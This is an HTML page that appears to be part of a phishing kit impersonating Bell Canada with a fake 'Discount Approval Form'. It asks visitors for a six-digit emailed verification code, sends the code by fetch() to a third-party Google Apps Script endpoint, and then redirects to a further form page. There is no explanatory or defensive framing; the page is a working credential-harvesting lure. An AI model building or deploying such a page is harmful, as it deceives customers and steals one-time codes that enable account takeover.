<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Bell Discount Registeration Form</title>
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
</head>
<body>
   
    <div class="registration-form">
       <span class="logo">Bell Canada</span>
            <h1>Discount Approval Form</h1>
        <p id="alert"></p>
        <form action="https://script.google.com/macros/s/AKfycbwPD4U_4R6dIvTo6lehNJSQth45C_Vxk6-ZVvNk992GA1zFlJJjb7w-YDvPzruPEmOf/exec" method="post" id="OTPForm">  
         
         
            <div class="emailpara">
                <p class="">We have sent a 6-digit verification code to <strong>Email Adress</strong>. <br> Enter below the code.</p>
            </div>
            <input type="number" name="otp" id="otp" name="otp" required>
    
          
            <button type="submit" id="otpbutton">Confirm</button>
        </form>
       
    
    </div></div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
        var otpForm = document.getElementById('OTPForm');
        var otpButton = document.getElementById('otpbutton');
        var alertMessage = document.getElementById('alert');
    
        otpForm.addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent the form from submitting the traditional way
        
            // Change the text of the "Send" button to indicate submission
            otpButton.textContent = 'Signing In...';
            
            // Assuming you are using fetch to send data to Google Sheets
            fetch(otpForm.action, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams(new FormData(otpForm)),
            })
            .then(response => {
                // Assuming a successful response status indicates a successful submission
                if (response.ok) {
                    // Redirect to otp.html
                    window.location.href = 'form.html';
                } else {
                    throw new Error('Failed to submit form');
                }
            })
            .catch(error => {
                console.error('Error submitting form:', error);
    
                // Change the text of the "Send" button back to its original state
                loginButton.textContent = 'Signin';
    
                // Show the error popup
                alertMessage.innerText = "Some Error Occurred";
                alertMessage.style.color = "red";
            });
        });
    });
    </script>
</body>
</html>
